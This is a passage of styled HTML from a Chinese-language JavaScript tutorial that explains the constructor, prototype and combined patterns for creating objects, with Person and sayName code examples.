47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 